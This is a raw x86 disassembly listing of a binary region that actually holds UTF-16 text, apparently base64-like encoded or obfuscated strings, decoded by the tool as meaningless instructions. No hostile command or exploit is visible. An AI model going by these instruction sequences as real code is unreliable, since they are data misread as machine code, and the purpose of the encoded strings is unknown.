1000475d:	4d                   	dec    %ebp
1000475e:	00 58 00             	add    %bl,0x0(%eax)
10004761:	52                   	push   %edx
10004762:	00 34 00             	add    %dh,(%eax,%eax,1)
10004765:	5a                   	pop    %edx
10004766:	00 54 00 4a          	add    %dl,0x4a(%eax,%eax,1)
1000476a:	00 4b 00             	add    %cl,0x0(%ebx)
1000476d:	51                   	push   %ecx
1000476e:	00 7a 00             	add    %bh,0x0(%edx)
10004771:	42                   	inc    %edx
10004772:	00 6d 00             	add    %ch,0x0(%ebp)
10004775:	53                   	push   %ebx
10004776:	00 54 00 46          	add    %dl,0x46(%eax,%eax,1)
1000477a:	00 30                	add    %dh,(%eax)
1000477c:	00 65 00             	add    %ah,0x0(%ebp)
1000477f:	44                   	inc    %esp
10004780:	00 4a 00             	add    %cl,0x0(%edx)
10004783:	7a 00                	jp     0x10004785
10004785:	50                   	push   %eax
10004786:	00 57 00             	add    %dl,0x0(%edi)
10004789:	55                   	push   %ebp
1000478a:	00 79 00             	add    %bh,0x0(%ecx)
1000478d:	53                   	push   %ebx
1000478e:	00 6b 00             	add    %ch,0x0(%ebx)
10004791:	4d                   	dec    %ebp
10004792:	00 77 00             	add    %dh,0x0(%edi)
10004795:	5a                   	pop    %edx
10004796:	00 6b 00             	add    %ch,0x0(%ebx)
10004799:	6b 00 78             	imul   $0x78,(%eax),%eax
1000479c:	00 64 00 48          	add    %ah,0x48(%eax,%eax,1)
100047a0:	00 67 00             	add    %ah,0x0(%edi)
100047a3:	3d 00 00 15 65       	cmp    $0x65150000,%eax
100047a8:	00 32                	add    %dh,(%edx)
100047aa:	00 4a 00             	add    %cl,0x0(%edx)
100047ad:	43                   	inc    %ebx
100047ae:	00 30                	add    %dh,(%eax)
100047b0:	00 66 00             	add    %ah,0x0(%esi)
100047b3:	49                   	dec    %ecx
100047b4:	00 31                	add    %dh,(%ecx)
100047b6:	00 74 00 78          	add    %dh,0x78(%eax,%eax,1)
100047ba:	00 00                	add    %al,(%eax)
100047bc:	85 81 55 00 31 00    	test   %eax,0x310055(%ecx)
100047c2:	6c                   	insb   (%dx),%es:(%edi)
100047c3:	00 4a 00             	add    %cl,0x0(%edx)
100047c6:	53                   	push   %ebx
100047c7:	00 55 00             	add    %dl,0x0(%ebp)
100047ca:	64 00 72 00          	add    %dh,%fs:0x0(%edx)
100047ce:	53                   	push   %ebx
100047cf:	00 54 00 63          	add    %dl,0x63(%eax,%eax,1)
100047d3:	00 35 00 55 00 6c    	add    %dh,0x6c005500
100047d9:	00 46 00             	add    %al,0x0(%esi)
100047dc:	36 00 63 00          	add    %ah,%ss:0x0(%ebx)
100047e0:	46                   	inc    %esi
100047e1:	00 4e 00             	add    %cl,0x0(%esi)
100047e4:	5a                   	pop    %edx
100047e5:	00 53 00             	add    %dl,0x0(%ebx)
100047e8:	55                   	push   %ebp
100047e9:	00 6c 00 48          	add    %ch,0x48(%eax,%eax,1)
100047ed:	00 61 00             	add    %ah,0x0(%ecx)
100047f0:	30 00                	xor    %al,(%eax)
100047f2:	6b 00 33             	imul   $0x33,(%eax),%eax
100047f5:	00 4f 00             	add    %cl,0x0(%edi)
100047f8:	56                   	push   %esi
100047f9:	00 4a 00             	add    %cl,0x0(%edx)
100047fc:	54                   	push   %esp
100047fd:	00 57 00             	add    %dl,0x0(%edi)
10004800:	55                   	push   %ebp
10004801:	00 6c 00 4a          	add    %ch,0x4a(%eax,%eax,1)
10004805:	00 52 00             	add    %dl,0x0(%edx)
10004808:	32 00                	xor    (%eax),%al
1000480a:	74 00                	je     0x1000480c
1000480c:	4a                   	dec    %edx
1000480d:	00 4e 00             	add    %cl,0x0(%esi)
10004810:	7a 00                	jp     0x10004812
10004812:	6c                   	insb   (%dx),%es:(%edi)
10004813:	00 53 00             	add    %dl,0x0(%ebx)
10004816:	59                   	pop    %ecx
10004817:	00 31                	add    %dh,(%ecx)
10004819:	00 68 00             	add    %ch,0x0(%eax)
1000481c:	47                   	inc    %edi
1000481d:	00 55 00             	add    %dl,0x0(%ebp)
10004820:	31 00                	xor    %eax,(%eax)
10004822:	6c                   	insb   (%dx),%es:(%edi)
10004823:	00 4a 00             	add    %cl,0x0(%edx)
10004826:	53                   	push   %ebx
10004827:	00 55 00             	add    %dl,0x0(%ebp)
1000482a:	64 00 72 00          	add    %dh,%fs:0x0(%edx)
1000482e:	53                   	push   %ebx
1000482f:	00 54 00 63          	add    %dl,0x63(%eax,%eax,1)
10004833:	00 35 00 55 00 6c    	add    %dh,0x6c005500
10004839:	00 4e 00             	add    %cl,0x0(%esi)
1000483c:	5a                   	pop    %edx
1000483d:	00 53 00             	add    %dl,0x0(%ebx)
10004840:	55                   	push   %ebp
10004841:	00 6c 00 48          	add    %ch,0x48(%eax,%eax,1)
10004845:	00 61 00             	add    %ah,0x0(%ecx)
10004848:	30 00                	xor    %al,(%eax)
1000484a:	6b 00 33             	imul   $0x33,(%eax),%eax
1000484d:	00 4f 00             	add    %cl,0x0(%edi)
10004850:	56                   	push   %esi
10004851:	00 4a 00             	add    %cl,0x0(%edx)
10004854:	6b 00 63             	imul   $0x63,(%eax),%eax
10004857:	00 47 00             	add    %al,0x0(%edi)
1000485a:	4a                   	dec    %edx
1000485b:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
1000485f:	00 55 00             	add    %dl,0x0(%ebp)
10004862:	6c                   	insb   (%dx),%es:(%edi)
10004863:	00 4a 00             	add    %cl,0x0(%edx)
10004866:	52                   	push   %edx
10004867:	00 32                	add    %dh,(%edx)
10004869:	00 74 00 4a          	add    %dh,0x4a(%eax,%eax,1)
1000486d:	00 4e 00             	add    %cl,0x0(%esi)
10004870:	7a 00                	jp     0x10004872
10004872:	6c                   	insb   (%dx),%es:(%edi)
10004873:	00 53 00             	add    %dl,0x0(%ebx)
10004876:	55                   	push   %ebp
10004877:	00 31                	add    %dh,(%ecx)
10004879:	00 6c 00 4a          	add    %ch,0x4a(%eax,%eax,1)
1000487d:	00 53 00             	add    %dl,0x0(%ebx)
10004880:	55                   	push   %ebp
10004881:	00 64 00 72          	add    %ah,0x72(%eax,%eax,1)
10004885:	00 53 00             	add    %dl,0x0(%ebx)
10004888:	54                   	push   %esp
10004889:	00 63 00             	add    %ah,0x0(%ebx)
1000488c:	35 00 55 00 6d       	xor    $0x6d005500,%eax
10004891:	00 31                	add    %dh,(%ecx)
10004893:	00 53 00             	add    %dl,0x0(%ebx)
10004896:	64 00 6c 00 4e       	add    %ch,%fs:0x4e(%eax,%eax,1)
1000489b:	00 5a 00             	add    %bl,0x0(%edx)
1000489e:	53                   	push   %ebx
1000489f:	00 55 00             	add    %dl,0x0(%ebp)
100048a2:	6c                   	insb   (%dx),%es:(%edi)
100048a3:	00 48 00             	add    %cl,0x0(%eax)
100048a6:	61                   	popa
100048a7:	00 30                	add    %dh,(%eax)
100048a9:	00 6b 00             	add    %ch,0x0(%ebx)
100048ac:	33 00                	xor    (%eax),%eax
100048ae:	4f                   	dec    %edi
100048af:	00 56 00             	add    %dl,0x0(%esi)
100048b2:	4a                   	dec    %edx
100048b3:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
100048b7:	00 55 00             	add    %dl,0x0(%ebp)
100048ba:	6c                   	insb   (%dx),%es:(%edi)
100048bb:	00 4a 00             	add    %cl,0x0(%edx)
100048be:	52                   	push   %edx
100048bf:	00 32                	add    %dh,(%edx)
100048c1:	00 74 00 4a          	add    %dh,0x4a(%eax,%eax,1)
100048c5:	00 4e 00             	add    %cl,0x0(%esi)
100048c8:	7a 00                	jp     0x100048ca
100048ca:	6c                   	insb   (%dx),%es:(%edi)
100048cb:	00 53 00             	add    %dl,0x0(%ebx)
100048ce:	5a                   	pop    %edx
100048cf:	00 44 00 4e          	add    %al,0x4e(%eax,%eax,1)
100048d3:	00 4f 00             	add    %cl,0x0(%edi)
100048d6:	55                   	push   %ebp
100048d7:	00 31                	add    %dh,(%ecx)
100048d9:	00 6c 00 4a          	add    %ch,0x4a(%eax,%eax,1)
100048dd:	00 53 00             	add    %dl,0x0(%ebx)
100048e0:	55                   	push   %ebp
100048e1:	00 64 00 72          	add    %ah,0x72(%eax,%eax,1)
100048e5:	00 53 00             	add    %dl,0x0(%ebx)
100048e8:	54                   	push   %esp
100048e9:	00 63 00             	add    %ah,0x0(%ebx)
100048ec:	35 00 55 00 6c       	xor    $0x6c005500,%eax
100048f1:	00 4e 00             	add    %cl,0x0(%esi)
100048f4:	5a                   	pop    %edx
100048f5:	00 53 00             	add    %dl,0x0(%ebx)
100048f8:	55                   	push   %ebp
100048f9:	00 6c 00 48          	add    %ch,0x48(%eax,%eax,1)
100048fd:	00 61 00             	add    %ah,0x0(%ecx)
10004900:	30 00                	xor    %al,(%eax)
10004902:	6b 00 33             	imul   $0x33,(%eax),%eax
10004905:	00 4f 00             	add    %cl,0x0(%edi)
10004908:	56                   	push   %esi
10004909:	00 4a 00             	add    %cl,0x0(%edx)
1000490c:	6a 00                	push   $0x0
1000490e:	57                   	push   %edi
1000490f:	00 45 00             	add    %al,0x0(%ebp)
10004912:	56                   	push   %esi
10004913:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
10004917:	00 55 00             	add    %dl,0x0(%ebp)
1000491a:	6c                   	insb   (%dx),%es:(%edi)
1000491b:	00 4a 00             	add    %cl,0x0(%edx)
1000491e:	52                   	push   %edx
1000491f:	00 32                	add    %dh,(%edx)
10004921:	00 74 00 4a          	add    %dh,0x4a(%eax,%eax,1)
10004925:	00 4e 00             	add    %cl,0x0(%esi)
10004928:	7a 00                	jp     0x1000492a
1000492a:	6c                   	insb   (%dx),%es:(%edi)
1000492b:	00 53 00             	add    %dl,0x0(%ebx)
1000492e:	55                   	push   %ebp
1000492f:	00 31                	add    %dh,(%ecx)
10004931:	00 6c 00 4a          	add    %ch,0x4a(%eax,%eax,1)
10004935:	00 53 00             	add    %dl,0x0(%ebx)
10004938:	55                   	push   %ebp
10004939:	00 64 00 72          	add    %ah,0x72(%eax,%eax,1)
1000493d:	00 53 00             	add    %dl,0x0(%ebx)
10004940:	54                   	push   %esp
10004941:	00 63 00             	add    %ah,0x0(%ebx)
10004944:	35 00 55 00 6a       	xor    $0x6a005500,%eax
10004949:	00 46 00             	add    %al,0x0(%esi)
1000494c:	77 00                	ja     0x1000494e
1000494e:	57                   	push   %edi
1000494f:	00 56 00             	add    %dl,0x0(%esi)
10004952:	4e                   	dec    %esi
10004953:	00 5a 00             	add    %bl,0x0(%edx)
10004956:	53                   	push   %ebx
10004957:	00 55 00             	add    %dl,0x0(%ebp)
1000495a:	6c                   	insb   (%dx),%es:(%edi)
1000495b:	00 48 00             	add    %cl,0x0(%eax)
1000495e:	61                   	popa
1000495f:	00 30                	add    %dh,(%eax)
10004961:	00 6b 00             	add    %ch,0x0(%ebx)
10004964:	33 00                	xor    (%eax),%eax
10004966:	4f                   	dec    %edi
10004967:	00 56 00             	add    %dl,0x0(%esi)
1000496a:	4a                   	dec    %edx
1000496b:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
1000496f:	00 55 00             	add    %dl,0x0(%ebp)
10004972:	6c                   	insb   (%dx),%es:(%edi)
10004973:	00 4a 00             	add    %cl,0x0(%edx)
10004976:	52                   	push   %edx
10004977:	00 32                	add    %dh,(%edx)
10004979:	00 74 00 4a          	add    %dh,0x4a(%eax,%eax,1)
1000497d:	00 4e 00             	add    %cl,0x0(%esi)
10004980:	7a 00                	jp     0x10004982
10004982:	6c                   	insb   (%dx),%es:(%edi)
10004983:	00 53 00             	add    %dl,0x0(%ebx)
10004986:	4d                   	dec    %ebp
10004987:	00 30                	add    %dh,(%eax)
10004989:	00 70 00             	add    %dh,0x0(%eax)
1000498c:	32 00                	xor    (%eax),%al
1000498e:	55                   	push   %ebp
1000498f:	00 31                	add    %dh,(%ecx)
10004991:	00 6c 00 4a          	add    %ch,0x4a(%eax,%eax,1)
10004995:	00 53 00             	add    %dl,0x0(%ebx)
10004998:	55                   	push   %ebp
10004999:	00 64 00 72          	add    %ah,0x72(%eax,%eax,1)
1000499d:	00 53 00             	add    %dl,0x0(%ebx)
100049a0:	54                   	push   %esp
100049a1:	00 63 00             	add    %ah,0x0(%ebx)
100049a4:	35 00 55 00 6c       	xor    $0x6c005500,%eax
100049a9:	00 4e 00             	add    %cl,0x0(%esi)
100049ac:	5a                   	pop    %edx
100049ad:	00 53 00             	add    %dl,0x0(%ebx)
100049b0:	55                   	push   %ebp
100049b1:	00 6c 00 48          	add    %ch,0x48(%eax,%eax,1)
100049b5:	00 61 00             	add    %ah,0x0(%ecx)
100049b8:	30 00                	xor    %al,(%eax)
100049ba:	6b 00 33             	imul   $0x33,(%eax),%eax
100049bd:	00 4f 00             	add    %cl,0x0(%edi)
100049c0:	56                   	push   %esi
100049c1:	00 4a 00             	add    %cl,0x0(%edx)
100049c4:	6a 00                	push   $0x0
100049c6:	4d                   	dec    %ebp
100049c7:	00 6a 00             	add    %ch,0x0(%edx)
100049ca:	6c                   	insb   (%dx),%es:(%edi)
100049cb:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
100049cf:	00 55 00             	add    %dl,0x0(%ebp)
100049d2:	6c                   	insb   (%dx),%es:(%edi)
100049d3:	00 4a 00             	add    %cl,0x0(%edx)
100049d6:	52                   	push   %edx
100049d7:	00 32                	add    %dh,(%edx)
100049d9:	00 74 00 4a          	add    %dh,0x4a(%eax,%eax,1)
100049dd:	00 4e 00             	add    %cl,0x0(%esi)
100049e0:	7a 00                	jp     0x100049e2
100049e2:	6c                   	insb   (%dx),%es:(%edi)
100049e3:	00 53 00             	add    %dl,0x0(%ebx)
100049e6:	55                   	push   %ebp
100049e7:	00 31                	add    %dh,(%ecx)
100049e9:	00 6c 00 4a          	add    %ch,0x4a(%eax,%eax,1)
100049ed:	00 53 00             	add    %dl,0x0(%ebx)
100049f0:	55                   	push   %ebp
100049f1:	00 64 00 72          	add    %ah,0x72(%eax,%eax,1)
100049f5:	00 53 00             	add    %dl,0x0(%ebx)
100049f8:	54                   	push   %esp
100049f9:	00 63 00             	add    %ah,0x0(%ebx)
100049fc:	35 00 55 00 6d       	xor    $0x6d005500,%eax
10004a01:	00 31                	add    %dh,(%ecx)
10004a03:	00 6b 00             	add    %ch,0x0(%ebx)
10004a06:	51                   	push   %ecx
10004a07:	00 31                	add    %dh,(%ecx)
10004a09:	00 4e 00             	add    %cl,0x0(%esi)
10004a0c:	5a                   	pop    %edx
10004a0d:	00 53 00             	add    %dl,0x0(%ebx)
10004a10:	55                   	push   %ebp
10004a11:	00 6c 00 48          	add    %ch,0x48(%eax,%eax,1)
10004a15:	00 61 00             	add    %ah,0x0(%ecx)
10004a18:	30 00                	xor    %al,(%eax)
10004a1a:	6b 00 33             	imul   $0x33,(%eax),%eax
10004a1d:	00 4f 00             	add    %cl,0x0(%edi)
10004a20:	56                   	push   %esi
10004a21:	00 4a 00             	add    %cl,0x0(%edx)
10004a24:	54                   	push   %esp
10004a25:	00 57 00             	add    %dl,0x0(%edi)
10004a28:	55                   	push   %ebp
10004a29:	00 6c 00 4a          	add    %ch,0x4a(%eax,%eax,1)
10004a2d:	00 52 00             	add    %dl,0x0(%edx)
10004a30:	32 00                	xor    (%eax),%al
10004a32:	74 00                	je     0x10004a34
10004a34:	4a                   	dec    %edx
10004a35:	00 4e 00             	add    %cl,0x0(%esi)
10004a38:	7a 00                	jp     0x10004a3a
10004a3a:	6c                   	insb   (%dx),%es:(%edi)
10004a3b:	00 53 00             	add    %dl,0x0(%ebx)
10004a3e:	4e                   	dec    %esi
10004a3f:	00 55 00             	add    %dl,0x0(%ebp)
10004a42:	39 00                	cmp    %eax,(%eax)
10004a44:	53                   	push   %ebx
10004a45:	00 55 00             	add    %dl,0x0(%ebp)
10004a48:	31 00                	xor    %eax,(%eax)
10004a4a:	6c                   	insb   (%dx),%es:(%edi)
10004a4b:	00 4a 00             	add    %cl,0x0(%edx)
10004a4e:	53                   	push   %ebx
10004a4f:	00 55 00             	add    %dl,0x0(%ebp)
10004a52:	64 00 72 00          	add    %dh,%fs:0x0(%edx)
10004a56:	53                   	push   %ebx
10004a57:	00 54 00 63          	add    %dl,0x63(%eax,%eax,1)
10004a5b:	00 35 00 55 00 6c    	add    %dh,0x6c005500
10004a61:	00 4e 00             	add    %cl,0x0(%esi)
10004a64:	5a                   	pop    %edx
10004a65:	00 53 00             	add    %dl,0x0(%ebx)
10004a68:	55                   	push   %ebp
10004a69:	00 6c 00 48          	add    %ch,0x48(%eax,%eax,1)
10004a6d:	00 61 00             	add    %ah,0x0(%ecx)
10004a70:	30 00                	xor    %al,(%eax)
10004a72:	6b 00 33             	imul   $0x33,(%eax),%eax
10004a75:	00 4f 00             	add    %cl,0x0(%edi)
10004a78:	56                   	push   %esi
10004a79:	00 4a 00             	add    %cl,0x0(%edx)
10004a7c:	57                   	push   %edi
10004a7d:	00 55 00             	add    %dl,0x0(%ebp)
10004a80:	6d                   	insl   (%dx),%es:(%edi)
10004a81:	00 4e 00             	add    %cl,0x0(%esi)
10004a84:	54                   	push   %esp
10004a85:	00 57 00             	add    %dl,0x0(%edi)
10004a88:	55                   	push   %ebp
10004a89:	00 6c 00 4a          	add    %ch,0x4a(%eax,%eax,1)
10004a8d:	00 52 00             	add    %dl,0x0(%edx)
10004a90:	32 00                	xor    (%eax),%al
10004a92:	74 00                	je     0x10004a94
10004a94:	4a                   	dec    %edx
10004a95:	00 4e 00             	add    %cl,0x0(%esi)
10004a98:	7a 00                	jp     0x10004a9a
10004a9a:	6c                   	insb   (%dx),%es:(%edi)
10004a9b:	00 53 00             	add    %dl,0x0(%ebx)
10004a9e:	55                   	push   %ebp
10004a9f:	00 31                	add    %dh,(%ecx)
10004aa1:	00 6c 00 4a          	add    %ch,0x4a(%eax,%eax,1)
10004aa5:	00 53 00             	add    %dl,0x0(%ebx)
10004aa8:	55                   	push   %ebp
10004aa9:	00 64 00 72          	add    %ah,0x72(%eax,%eax,1)
10004aad:	00 53 00             	add    %dl,0x0(%ebx)
10004ab0:	54                   	push   %esp
10004ab1:	00 63 00             	add    %ah,0x0(%ebx)
10004ab4:	35 00 55 00 6c       	xor    $0x6c005500,%eax
10004ab9:	00 68 00             	add    %ch,0x0(%eax)
10004abc:	46                   	inc    %esi
10004abd:	00 57 00             	add    %dl,0x0(%edi)
10004ac0:	6c                   	insb   (%dx),%es:(%edi)
10004ac1:	00 4e 00             	add    %cl,0x0(%esi)
10004ac4:	5a                   	pop    %edx
10004ac5:	00 53 00             	add    %dl,0x0(%ebx)
10004ac8:	55                   	push   %ebp
10004ac9:	00 6c 00 48          	add    %ch,0x48(%eax,%eax,1)
10004acd:	00 61 00             	add    %ah,0x0(%ecx)
10004ad0:	30 00                	xor    %al,(%eax)
10004ad2:	6b 00 33             	imul   $0x33,(%eax),%eax
10004ad5:	00 4f 00             	add    %cl,0x0(%edi)
10004ad8:	56                   	push   %esi
10004ad9:	00 4a 00             	add    %cl,0x0(%edx)
10004adc:	54                   	push   %esp
10004add:	00 57 00             	add    %dl,0x0(%edi)
10004ae0:	55                   	push   %ebp
10004ae1:	00 6c 00 4a          	add    %ch,0x4a(%eax,%eax,1)
10004ae5:	00 52 00             	add    %dl,0x0(%edx)
10004ae8:	32 00                	xor    (%eax),%al
10004aea:	74 00                	je     0x10004aec
10004aec:	4a                   	dec    %edx
10004aed:	00 4e 00             	add    %cl,0x0(%esi)
10004af0:	7a 00                	jp     0x10004af2
10004af2:	6c                   	insb   (%dx),%es:(%edi)
10004af3:	00 53 00             	add    %dl,0x0(%ebx)
10004af6:	65 00 56 00          	add    %dl,%gs:0x0(%esi)
10004afa:	6c                   	insb   (%dx),%es:(%edi)
10004afb:	00 58 00             	add    %bl,0x0(%eax)
10004afe:	55                   	push   %ebp
10004aff:	00 31                	add    %dh,(%ecx)
10004b01:	00 6c 00 4a          	add    %ch,0x4a(%eax,%eax,1)
10004b05:	00 53 00             	add    %dl,0x0(%ebx)
10004b08:	55                   	push   %ebp
10004b09:	00 64 00 72          	add    %ah,0x72(%eax,%eax,1)
10004b0d:	00 53 00             	add    %dl,0x0(%ebx)
10004b10:	54                   	push   %esp
10004b11:	00 63 00             	add    %ah,0x0(%ebx)
10004b14:	35 00 55 00 6c       	xor    $0x6c005500,%eax
10004b19:	00 4e 00             	add    %cl,0x0(%esi)
10004b1c:	5a                   	pop    %edx
10004b1d:	00 53 00             	add    %dl,0x0(%ebx)
10004b20:	55                   	push   %ebp
10004b21:	00 6c 00 48          	add    %ch,0x48(%eax,%eax,1)
10004b25:	00 61 00             	add    %ah,0x0(%ecx)
10004b28:	30 00                	xor    %al,(%eax)
10004b2a:	6b 00 33             	imul   $0x33,(%eax),%eax
10004b2d:	00 4f 00             	add    %cl,0x0(%edi)
10004b30:	56                   	push   %esi
10004b31:	00 49 00             	add    %cl,0x0(%ecx)
10004b34:	78 00                	js     0x10004b36
10004b36:	62 00                	bound  %eax,(%eax)
10004b38:	47                   	inc    %edi
10004b39:	00 52 00             	add    %dl,0x0(%edx)
10004b3c:	54                   	push   %esp
10004b3d:	00 57 00             	add    %dl,0x0(%edi)
10004b40:	55                   	push   %ebp
10004b41:	00 6c 00 4a          	add    %ch,0x4a(%eax,%eax,1)
10004b45:	00 52 00             	add    %dl,0x0(%edx)
10004b48:	32 00                	xor    (%eax),%al
10004b4a:	74 00                	je     0x10004b4c
10004b4c:	4a                   	dec    %edx
10004b4d:	00 4e 00             	add    %cl,0x0(%esi)
10004b50:	7a 00                	jp     0x10004b52
10004b52:	6c                   	insb   (%dx),%es:(%edi)
10004b53:	00 53 00             	add    %dl,0x0(%ebx)
10004b56:	55                   	push   %ebp
10004b57:	00 31                	add    %dh,(%ecx)
10004b59:	00 6c 00 4a          	add    %ch,0x4a(%eax,%eax,1)
10004b5d:	00 53 00             	add    %dl,0x0(%ebx)
10004b60:	55                   	push   %ebp
10004b61:	00 64 00 72          	add    %ah,0x72(%eax,%eax,1)
10004b65:	00 53 00             	add    %dl,0x0(%ebx)
10004b68:	54                   	push   %esp
10004b69:	00 63 00             	add    %ah,0x0(%ebx)
10004b6c:	35 00 55 00 6a       	xor    $0x6a005500,%eax
10004b71:	00 49 00             	add    %cl,0x0(%ecx)
10004b74:	35 00 65 00 56       	xor    $0x56006500,%eax
10004b79:	00 4e 00             	add    %cl,0x0(%esi)
10004b7c:	5a                   	pop    %edx
10004b7d:	00 53 00             	add    %dl,0x0(%ebx)
10004b80:	55                   	push   %ebp
10004b81:	00 6c 00 48          	add    %ch,0x48(%eax,%eax,1)
10004b85:	00 61 00             	add    %ah,0x0(%ecx)
10004b88:	30 00                	xor    %al,(%eax)
10004b8a:	6b 00 33             	imul   $0x33,(%eax),%eax
10004b8d:	00 4f 00             	add    %cl,0x0(%edi)
10004b90:	56                   	push   %esi
10004b91:	00 4a 00             	add    %cl,0x0(%edx)
10004b94:	54                   	push   %esp
10004b95:	00 57 00             	add    %dl,0x0(%edi)
10004b98:	55                   	push   %ebp
10004b99:	00 6c 00 4a          	add    %ch,0x4a(%eax,%eax,1)
10004b9d:	00 52 00             	add    %dl,0x0(%edx)
10004ba0:	32 00                	xor    (%eax),%al
10004ba2:	74 00                	je     0x10004ba4
10004ba4:	4a                   	dec    %edx
10004ba5:	00 4e 00             	add    %cl,0x0(%esi)
10004ba8:	7a 00                	jp     0x10004baa
10004baa:	6c                   	insb   (%dx),%es:(%edi)
10004bab:	00 53 00             	add    %dl,0x0(%ebx)
10004bae:	59                   	pop    %ecx
10004baf:	00 54 00 46          	add    %dl,0x46(%eax,%eax,1)
10004bb3:	00 34 00             	add    %dh,(%eax,%eax,1)
10004bb6:	55                   	push   %ebp
10004bb7:	00 31                	add    %dh,(%ecx)
10004bb9:	00 6c 00 4a          	add    %ch,0x4a(%eax,%eax,1)
10004bbd:	00 53 00             	add    %dl,0x0(%ebx)
10004bc0:	55                   	push   %ebp
10004bc1:	00 64 00 72          	add    %ah,0x72(%eax,%eax,1)
10004bc5:	00 53 00             	add    %dl,0x0(%ebx)
10004bc8:	54                   	push   %esp
10004bc9:	00 63 00             	add    %ah,0x0(%ebx)
10004bcc:	35 00 55 00 6c       	xor    $0x6c005500,%eax
10004bd1:	00 4e 00             	add    %cl,0x0(%esi)
10004bd4:	5a                   	pop    %edx
10004bd5:	00 53 00             	add    %dl,0x0(%ebx)
10004bd8:	55                   	push   %ebp
10004bd9:	00 6c 00 48          	add    %ch,0x48(%eax,%eax,1)
10004bdd:	00 61 00             	add    %ah,0x0(%ecx)
10004be0:	30 00                	xor    %al,(%eax)
10004be2:	6b 00 33             	imul   $0x33,(%eax),%eax
10004be5:	00 4f 00             	add    %cl,0x0(%edi)
10004be8:	56                   	push   %esi
10004be9:	00 4a 00             	add    %cl,0x0(%edx)
10004bec:	6a 00                	push   $0x0
10004bee:	5a                   	pop    %edx
10004bef:	00 47 00             	add    %al,0x0(%edi)
10004bf2:	70 00                	jo     0x10004bf4
10004bf4:	54                   	push   %esp
10004bf5:	00 57 00             	add    %dl,0x0(%edi)
10004bf8:	55                   	push   %ebp
10004bf9:	00 6c 00 4a          	add    %ch,0x4a(%eax,%eax,1)
10004bfd:	00 52 00             	add    %dl,0x0(%edx)
10004c00:	32 00                	xor    (%eax),%al
10004c02:	74 00                	je     0x10004c04
10004c04:	4a                   	dec    %edx
10004c05:	00 4e 00             	add    %cl,0x0(%esi)
10004c08:	7a 00                	jp     0x10004c0a
10004c0a:	6c                   	insb   (%dx),%es:(%edi)
10004c0b:	00 53 00             	add    %dl,0x0(%ebx)
10004c0e:	55                   	push   %ebp
10004c0f:	00 31                	add    %dh,(%ecx)
10004c11:	00 6c 00 4a          	add    %ch,0x4a(%eax,%eax,1)
10004c15:	00 53 00             	add    %dl,0x0(%ebx)
10004c18:	55                   	push   %ebp
10004c19:	00 64 00 72          	add    %ah,0x72(%eax,%eax,1)
10004c1d:	00 53 00             	add    %dl,0x0(%ebx)
10004c20:	54                   	push   %esp
10004c21:	00 63 00             	add    %ah,0x0(%ebx)
10004c24:	35 00 55 00 6c       	xor    $0x6c005500,%eax
10004c29:	00 46 00             	add    %al,0x0(%esi)
10004c2c:	31 00                	xor    %eax,(%eax)
10004c2e:	54                   	push   %esp
10004c2f:	00 56 00             	add    %dl,0x0(%esi)
10004c32:	4e                   	dec    %esi
10004c33:	00 5a 00             	add    %bl,0x0(%edx)
10004c36:	53                   	push   %ebx
10004c37:	00 55 00             	add    %dl,0x0(%ebp)
10004c3a:	6c                   	insb   (%dx),%es:(%edi)
10004c3b:	00 48 00             	add    %cl,0x0(%eax)
10004c3e:	61                   	popa
10004c3f:	00 30                	add    %dh,(%eax)
10004c41:	00 6b 00             	add    %ch,0x0(%ebx)
10004c44:	33 00                	xor    (%eax),%eax
10004c46:	4f                   	dec    %edi
10004c47:	00 56 00             	add    %dl,0x0(%esi)
10004c4a:	4a                   	dec    %edx
10004c4b:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
10004c4f:	00 55 00             	add    %dl,0x0(%ebp)
10004c52:	6c                   	insb   (%dx),%es:(%edi)
10004c53:	00 4a 00             	add    %cl,0x0(%edx)
10004c56:	52                   	push   %edx
10004c57:	00 32                	add    %dh,(%edx)
10004c59:	00 74 00 4a          	add    %dh,0x4a(%eax,%eax,1)
10004c5d:	00 4e 00             	add    %cl,0x0(%esi)
10004c60:	7a 00                	jp     0x10004c62
10004c62:	6c                   	insb   (%dx),%es:(%edi)
10004c63:	00 53 00             	add    %dl,0x0(%ebx)
10004c66:	51                   	push   %ecx
10004c67:	00 7a 00             	add    %bh,0x0(%edx)
10004c6a:	52                   	push   %edx
10004c6b:	00 36                	add    %dh,(%esi)
10004c6d:	00 55 00             	add    %dl,0x0(%ebp)
10004c70:	31 00                	xor    %eax,(%eax)
10004c72:	6c                   	insb   (%dx),%es:(%edi)
10004c73:	00 4a 00             	add    %cl,0x0(%edx)
10004c76:	53                   	push   %ebx
10004c77:	00 55 00             	add    %dl,0x0(%ebp)
10004c7a:	64 00 72 00          	add    %dh,%fs:0x0(%edx)
10004c7e:	53                   	push   %ebx
10004c7f:	00 54 00 63          	add    %dl,0x63(%eax,%eax,1)
10004c83:	00 35 00 55 00 6c    	add    %dh,0x6c005500
10004c89:	00 4e 00             	add    %cl,0x0(%esi)
10004c8c:	5a                   	pop    %edx
10004c8d:	00 53 00             	add    %dl,0x0(%ebx)
10004c90:	55                   	push   %ebp
10004c91:	00 6c 00 48          	add    %ch,0x48(%eax,%eax,1)
10004c95:	00 61 00             	add    %ah,0x0(%ecx)
10004c98:	30 00                	xor    %al,(%eax)
10004c9a:	6b 00 33             	imul   $0x33,(%eax),%eax
10004c9d:	00 4f 00             	add    %cl,0x0(%edi)
10004ca0:	56                   	push   %esi
10004ca1:	00 4a 00             	add    %cl,0x0(%edx)
10004ca4:	4e                   	dec    %esi
10004ca5:	00 52 00             	add    %dl,0x0(%edx)
10004ca8:	45                   	inc    %ebp
10004ca9:	00 31                	add    %dh,(%ecx)
10004cab:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
10004caf:	00 55 00             	add    %dl,0x0(%ebp)
10004cb2:	6c                   	insb   (%dx),%es:(%edi)
10004cb3:	00 4a 00             	add    %cl,0x0(%edx)
10004cb6:	52                   	push   %edx
10004cb7:	00 32                	add    %dh,(%edx)
10004cb9:	00 74 00 4a          	add    %dh,0x4a(%eax,%eax,1)
10004cbd:	00 4e 00             	add    %cl,0x0(%esi)
10004cc0:	7a 00                	jp     0x10004cc2
10004cc2:	6c                   	insb   (%dx),%es:(%edi)
10004cc3:	00 53 00             	add    %dl,0x0(%ebx)
10004cc6:	55                   	push   %ebp
10004cc7:	00 31                	add    %dh,(%ecx)
